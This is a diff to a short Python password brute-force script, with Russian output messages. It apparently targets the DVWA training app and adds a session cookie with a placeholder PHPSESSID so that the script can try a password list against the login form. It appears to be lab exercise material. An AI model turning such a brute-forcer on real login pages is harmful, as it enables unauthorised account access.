@@ -12,6 +12,11 @@ passwords = [
     "password123"
 ]
 
+cookies = {
+    "security": "low",
+    "PHPSESSID": "ВСТАВЬ_СЮДА_СВОЙ_PHPSESSID"
+}
+
 for password in passwords:
     params = {
         "username": username,
@@ -19,11 +24,12 @@ for password in passwords:
         "Login": "Login"
     }
 
-    response = requests.get(url, params=params)
+    r = requests.get(url, params=params, cookies=cookies)
 
-    if "Welcome to the password protected area" in response.text:
+    if "Welcome to the password protected area" in r.text:
         print(f"[+] Пароль найден: {password}")
         break
     else:
         print(f"[-] Неверный пароль: {password}")
+
 
